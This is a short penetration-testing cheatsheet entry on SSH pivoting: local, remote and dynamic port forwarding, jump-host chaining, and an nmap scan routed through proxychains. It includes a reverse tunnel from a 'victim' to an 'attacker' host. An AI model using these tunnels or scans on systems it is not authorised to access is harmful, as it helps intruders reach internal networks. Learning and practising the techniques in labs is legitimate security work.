# 13.02 SSH Local Remote Dynamic

> Pivot through SSH with `-L` (internal‚Üílocal), `-R` (local‚Üíremote), and `-D` (SOCKS5) combined with `proxychains`.

## Overview

Three flavors: -L brings internal to local; -R exposes local to remote; -D makes a SOCKS5 proxy. Combine with proxychains for any TCP tool through SSH.

## Steps

- **-L localport:host:port** ‚Äî internal:port via local SSH client.
- **-R remoteport:host:port** ‚Äî expose attacker port from victim.
- **-D localport** ‚Äî SOCKS5 proxy.
- **-J jump1,jump2** ‚Äî chain bastions.

## Commands

### Cheatsheet

```bash
ssh -L 8080:internal.lab:80   user@pivot          # access internal:80 via localhost:8080
ssh -R <LPORT>:localhost:<LPORT>    user@attacker        # expose victim:<LPORT> to attacker
ssh -D 1080                    user@pivot           # SOCKS5
ssh -J user1@pivot1 user2@pivot2                     # chain
```

### proxychains

```bash
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
proxychains -q nmap -sT -p- <TARGET>
```
